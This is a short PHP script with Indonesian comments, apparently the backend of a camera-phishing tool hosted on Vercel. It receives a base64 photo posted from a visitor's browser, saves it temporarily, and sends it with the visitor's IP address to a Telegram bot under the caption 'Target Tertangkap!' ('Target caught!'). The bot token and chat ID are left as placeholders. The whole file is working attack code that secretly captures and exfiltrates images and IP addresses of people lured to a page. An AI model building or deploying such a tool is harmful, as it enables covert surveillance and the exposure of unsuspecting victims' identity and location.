<?php
$botToken = "Masukan_Token_Bot_Dari_BotFather";
$chatId = "Masukan_Chat_ID_Kamu";

$imageData = $_POST['cat'];

if (!empty($imageData)) {
    // Bersihkan data base64
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    
    // Simpan sementara di folder /tmp vercel
    $tempFile = tempnam(sys_get_temp_dir(), 'cam') . '.png';
    file_put_contents($tempFile, $unencodedData);

    // Kirim ke Telegram
    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
    $post_fields = [
        'chat_id' => $chatId,
        'photo'   => new CURLFile($tempFile),
        'caption' => "📸 Target Tertangkap!\nIP: " . $_SERVER['REMOTE_ADDR']
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_exec($ch);
    curl_close($ch);
    unlink($tempFile);
}
?>
